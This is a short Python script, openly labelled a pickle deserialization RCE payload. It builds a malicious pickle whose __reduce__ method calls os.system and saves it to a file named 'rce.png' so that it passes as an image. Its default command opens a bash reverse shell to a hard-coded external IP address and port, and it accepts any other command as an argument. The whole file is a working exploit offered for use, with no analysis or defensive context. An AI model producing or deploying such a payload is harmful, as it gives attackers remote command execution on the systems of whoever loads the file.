#!/usr/bin/python
#
# Pickle deserialization RCE payload.
# To be invoked with command to execute at it's first parameter.
# Otherwise, the default one will be used.
#

import pickle
import sys
DEFAULT_COMMAND="/bin/bash -c '/bin/sh -i >& /dev/tcp/3.68.56.232/10421 0>&1'"
COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

with open('rce.png', 'wb') as outF:
    outF.write(pickle.dumps(PickleRce()))
